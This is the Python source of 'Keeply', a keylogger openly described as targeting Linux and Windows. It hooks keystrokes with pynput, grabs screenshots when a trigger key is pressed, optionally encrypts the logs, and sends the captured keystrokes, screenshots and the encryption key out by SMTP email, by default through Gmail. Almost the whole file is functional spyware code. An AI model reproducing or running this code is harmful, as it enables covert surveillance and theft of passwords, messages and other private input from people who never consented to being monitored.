from ctypes import Structure, windll, c_uint, sizeof, byref
import os, platform, sys, time, datetime
import argparse
try:
    if platform.system() == 'Linux':
        if not os.geteuid() == 0:
            sys.exit('Keeply must be run as root')
    elif platform.system() == 'Windows':
        os.system('color a')
    print(f'\nSetting to {platform.system()}')
except OSError:
    os.system('cls' if os.name == 'nt' else 'clear')
    sys.exit('OS not supported')

# GLOBAL VARIABLES BEFORE ASSINAGMENT
keys = []
# screenshot
input_key, method_key = '', False

counter_time = 0

#########################################################################
'''
FUNCTIONS
'''
#########################################################################
# ARGPARSE
def  parserArguments():
    # parser and group
    description = 'Keeply: keylogger for linux and windows with crypted messages to email and decrypted function.'
    parser = argparse.ArgumentParser(description=description,
                                    epilog='Made by Y4rd13.')
    group = parser.add_mutually_exclusive_group()

    # CORES
    parser.add_argument('-i', '--installation', action='store_true', help='Install core packages') # installation

    # TRANSFER
    parser.add_argument('-t', '--transfer', type=str, metavar='', help='Transfer method: fpt, email, usb, hdd', 
                        choices=(['fpt', 'email', 'usb', 'hdd']))
    parser.add_argument('-temp', '--temporary_file', type=bool, metavar='', 
                        help='Creates a temporary directory with logs.txt [True, default: False] (recommended to encrypt the data --encrypt)', default=False)
    
    # SERVER
    parser.add_argument('-u', '--user', type=str, metavar='', help='Username (mail)') # user (mail)
    parser.add_argument('-p', '--password', type=str, metavar='', help='Username passowrd') # password
    parser.add_argument('--port', type=int, metavar='', help='SMTP port (default=465)', default=465) # port: 465 standar port to ssl (router can block the conection).
    parser.add_argument('--smtp', type=str, metavar='', help='SMTP mail (default=smtp.gmail.com)', default='smtp.gmail.com') # smtp
    
    # MESSAGE SETTINGS
    parser.add_argument('--encrypt', type=bool, metavar='', help='Encrypt message with key: True (default: False)', default=False)
    parser.add_argument('-l', '--lines', type=int, metavar='', help='Max lines to send (default = 5)', default=5) # ten lines
    parser.add_argument('-ss', '--screenshot', type=str, metavar='',
                         help='Enable Screenshot: click, key, keyword', choices=(['click', 'key', 'keyword'])) # screenshot    
    group.add_argument('--start', action='store_true', help='Initialize keeylogger')
    
    # DECRYPTH
    parser.add_argument('-K', '--key', type=str, metavar='', help='Key to decrypth') # cryptography key
    parser.add_argument('-F', '--filename', type=str, metavar='', help='Directory ../filename.txt with encrypted text') # encrypted filename
    group.add_argument('--decrypth', action='store_true', help='Decrypth the message')

    return parser.parse_args()

# INSTALLATION
def installation():
    # Installations
    initialize_import = False
    print(f'\nSetting configuration to {platform.system()}.\n')
    time.sleep(1)
    try:
        os.system('pip install cryptography' if os.name == 'nt' else 'sudo pip3 install cryptography')
        os.system('pip install pyautogui' if os.name == 'nt' else 'sudo pip3 install pyautogui')
        os.system('pip install stegano' if os.name == 'nt' else 'sudo pip3 install stegano')
        os.system('pip install pynput' if os.name == 'nt' else 'sudo pip3 install pynput')
        os.system('pip install tqdm' if os.name == 'nt' else 'sudo pip3 install tqdm')

        if os.name == 'posix':
            os.system('sudo apt-get install scrot')

        initialize_import = True
        os.system('cls' if os.name == 'nt' else 'clear')
    except OSError as install_error:
        print('OSInstall error', install_error)
    finally:
        return initialize_import

#LAST INPUT INFO
class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

def get_idle_duration():
    while True:
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = sizeof(lastInputInfo)
        windll.user32.GetLastInputInfo(byref(lastInputInfo))
        millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
        millis = millis / 1000.0
        print(f'\t{millis}')
        time.sleep(0.1) 
    #return  millis

# DATE EASY ACCESS
def date_funct():
    date = datetime.datetime.now()
    return date.strftime('%x %X %p')

# loading
def loading(r2, r1=0, text='', s=1):
    print(text)
    for __ in tqdm(range(r1, r2)):
        time.sleep(s)

# TEMPORARY DIRECTORY
def Temporary_Directory():
    user_os=getpass.getuser()    
    if platform.system() == 'Linux':
        path = f'/home/{user_os}/Escritorio/codes/'
    elif platform.system() == 'Windows':
        path = f'C:/Users/{user_os}/Videos/Captures/'
    
    if not os.path.exists(path):
        os.mkdir(path)
    return tempfile.TemporaryDirectory(dir=path, prefix='temp')
   
def close_temp_dir(temp_dir):
    shutil.rmtree(temp_dir)
    print(f'{temp_dir} closed')

### TRANSFER METHODS###
def transfer_method(funct_method, message):
    if funct_method == 'email':
        send_mail(message=message, user=args.user, password=args.password, 
                    smtp_mail=args.smtp, port=args.port)

# EMAIL
def from_to_date_subject(user, msg):
    msg['From'] = user
    msg['To'] = user
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = f'{formatdate(localtime=True)} || KEEPLY ||'
    return msg

def mail_info(user, message, screenshot):
    if screenshot == True:
        msg = EmailMessage()
        from_to_date_subject(user=user, msg=msg)
        msg.add_attachment(message, maintype='image', subtype='png') # attach png image
    elif args.temporary_file == True:
        msg = MIMEMultipart()
        from_to_date_subject(user=user, msg=msg)
        fdate = date_funct().replace('/', '-').replace(':', '.')
        with tempfile.TemporaryDirectory(dir=f'C:/Users/{getpass.getuser()}/Videos/Captures/', prefix='temp_') as td:
            with open(f'{td}/{fdate}.txt', 'w+') as attach_txt:
                attach_txt.write(message)
                attach_txt.seek(0)
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attach_txt.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 
                                f'attachment; filename={fdate}.txt')    
                msg.attach(part)
                print('\nSuccesfully attached\n')
    else:
        msg = EmailMessage()
        from_to_date_subject(user=user, msg=msg)
        msg.set_content(message) # set content text
    return msg

def send_mail(message, user, password, smtp_mail, port, screenshot=False):
    msg = mail_info(user, message, screenshot=screenshot)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(host=smtp_mail, port=port, context=context) as server:
        try:
            '''conect to the server'''
            server.login(user=user, password=password)
            server.sendmail(from_addr='Keeply', to_addrs=user, msg=msg.as_string())    
            print('\nSent email\n')
        except:
            print('\nGoogle is not allowing you to log in via smtplib because it has flagged this sort of login as "less secure".')
            print('While youre logged in to your google account, allow the access for less secure apps.')
            print('\nYour browser will be open to the google "lesssecureapps" link in 10 seconds.')
            loading(r2=15)
            webbrowser.open('https://www.google.com/settings/security/lesssecureapps')

##################################
# CRYPTOGRAPHY
def cipher_key():
    KEY = Fernet.generate_key()
    return KEY

def enrcypt_message(KEY, message):
    cipher = Fernet(KEY)
    encrypted_text = cipher.encrypt(bytes(message, encoding='utf-8',))
    return encrypted_text

def decrypted_message(encrypted_text, KEY):
    cipher = Fernet(KEY)
    decrypted_text = (cipher.decrypt(encrypted_text)).decode()
    return decrypted_text

#################################
# KEYBOARD CAPTURE
def write_keys(keys):
    global message_keys, KEY
    global caps_lock_press
    global capt_sec_state, future_time
    global TIMES_PASSED

    MAX_CHAR = 147 * args.lines
    LEN_CHAR = 142  # time + message (one line) = 147 characteres
    seconds = get_sec()
    time_str = datetime.datetime.now().strftime('%X')

    if capt_sec_state == False:
        message_keys += (f'\n{time_str}\t')
        future_time = (seconds + 600)
        capt_sec_state = True
    elif capt_sec_state == True:
        if seconds >= future_time:
            message_keys += (f'\n\n{time_str}\n')
            capt_sec_state = False
    for key in keys:
        k = str(key).replace("'", "")
        screen_shot(method=args.screenshot, key_str=k)
        print(len(message_keys), MAX_CHAR, TIMES_PASSED)
        if k.find('space') > 0:
            message_keys += ' '
        elif k.find('Key.caps_lock') == 0:
            caps_lock_press += 1
        elif k.find('Key') == -1:
            if caps_lock_press == 1:
                message_keys += (k.upper())
            elif caps_lock_press == 2:
                message_keys += (k)
                caps_lock_press = 0
            else:
                if len(message_keys) == (LEN_CHAR * TIMES_PASSED): 
                    message_keys += f'\n{time_str}\t'
                    TIMES_PASSED += 1
                else:
                    message_keys += (k)

    if args.encrypt:
        encrypted_text = (enrcypt_message(KEY=KEY, message=message_keys)).decode()
        if (len(message_keys)) >= MAX_CHAR:
            print('Encrypted')
            transfer_method(funct_method=args.transfer, 
            message=f'''
            \n\n{date_funct()}\n{encrypted_text}
            ''')
            message_keys = ' '
            TIMES_PASSED = 1
    else:
        if (len(message_keys)) >= MAX_CHAR: # establecer tiempo máximo
            transfer_method(funct_method=args.transfer, 
            message=f'\n\n{date_funct()}\n{message_keys}')
            message_keys = ' '
            TIMES_PASSED = 1

def write_special_keys(keys):
    global message_special
    for key in keys:
        k = str(key).replace("'", "")
        screen_shot(method=args.screenshot, key_str=k)
        message_special += (k + ' ')
    return message_special

# keyboard on press & on release
def on_press(key):
    global keys
    keys.append(key)
    write_keys(keys)
    write_special_keys(keys) #except AttributeError
    keys = []

##################################################################
def screen_shot(key_str, method=False):
    global input_key, method_key
    if os.name == 'nt':
        if method == 'key':
            if method_key == False:
                input_key = key_str
                print(f'Predefine key: {input_key}')
                method_key = True
            else:
                if key_str == input_key:
                    fdate = date_funct()
                    fdate = fdate.replace('/', '-').replace(':','.')
                    temp_dir = Temporary_Directory() # OPEN Temporary Directory
                    file_format = f'{temp_dir.name}/{fdate}.png'
                    print(f'\nCreating screenshot...\nFile: {file_format}\nTemporary directory: {temp_dir.name}\n')
                    myScreenshot = pyautogui.screenshot()
                    myScreenshot.save(file_format)

                    with open(file_format, 'rb') as fp:
                        img_data = fp.read()
                    send_mail(message=img_data, user=args.user, password=args.password, 
                            smtp_mail=args.smtp, port=args.port, screenshot=True)
                    close_temp_dir(temp_dir=temp_dir.name) # CLOSE Temporary Directory
#        elif method == 'click':
#        elif method == 'keyword':            
    else:
        print(f'Unable to get the screenshot on.')

def get_sec():
    time_str = datetime.datetime.now().strftime('%X')
    print(time_str)
    day_str = datetime.datetime.now().strftime('%w')

    if len(time_str.split(':')) < 3:
        time_str = time_str + ':00'

    h, m, __ = time_str.split(':')
    day_sec, d = 86000, int(day_str)    
    if d == 0:
      dx = day_sec * 7
    else:
      dx = day_sec * d
    return  dx - (day_sec - (int(h) * 3600 + int(m) * 60))

#########################################################################
def main():
    try:
        listener = Listener(on_press=on_press)
        idle_duration = threading.Thread(target=get_idle_duration)
        listener.start()
        idle_duration.start()
        listener.join()
        idle_duration.join()
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        sys.exit(0)

#########################################################################
#########################################################################
'''
NAME == MAIN
'''
#########################################################################
#########################################################################
if __name__ == "__main__":
    # ARGPARSER
    args = parserArguments()
    
    if len(sys.argv) > 1:
        #INSTALLATION
        if args.installation:
            initialize_import = installation()
        try:
            import pynput, pyautogui, webbrowser
            from pynput.keyboard import Listener, Key
            
            import smtplib, ssl
            from email.message import EmailMessage
            from email.utils import formatdate
            from email.mime.multipart import MIMEMultipart
            from email.mime.base import MIMEBase
            from email import encoders

            import tempfile, shutil, getpass, threading
            from cryptography.fernet import Fernet
            from tqdm import tqdm

            print('\nCorrectly imported.')
            loading(r2=100, s=0.015)
            os.system('cls' if os.name == 'nt' else 'clear')
        except ImportError as Import_Error:
            print('Import Error: ', Import_Error)

        # WRITE_KEYS VARIABLES
        TIMES_PASSED = 1
        caps_lock_press = 0
        capt_sec_state, future_time = False, 0
        message_keys, message_special = ' ', ''

        # START AND DECRYPTH
        try:
            if args.start:
                if args.encrypt == True:
                    KEY = cipher_key()
                    send_mail(message = f'\n\nKEY:\n{KEY.decode()}', user=args.user, password=args.password,
                            smtp_mail=args.smtp, port=args.port)
                    print('\nYour KEY was sent successfully\n')
                if args.screenshot in ['key', 'keyword']:
                    print(f'Input your predefine {(args.screenshot).upper()} to take screenshots:')
                elif args.screenshot == ['click']:
                    print(f'{(args.screenshot).upper()} will take screenshots')
   
                main()
            elif args.decrypth:
                input_key = args.key
                encrypted_file = args.filename
                with open(encrypted_file, 'r') as encrypted_data:
                    encrypted_data = bytes(encrypted_data.read(), encoding='utf-8')
                    decrypted_data = decrypted_message(encrypted_text=encrypted_data, KEY=input_key)
                    print(decrypted_data)
                loading(r2=30)
        except KeyboardInterrupt:
            os.system('cls' if os.name == 'nt' else 'clear')
            sys.exit(0)
    else:
        try:
            print('\n\tTo see how to use keeply: keeply.py [-h] --help.')
            time.sleep(10)
            os.system('cls' if os.name == 'nt' else 'clear')
            sys.exit(0)
        except KeyboardInterrupt:
            os.system('cls' if os.name == 'nt' else 'clear')
            sys.exit(0)
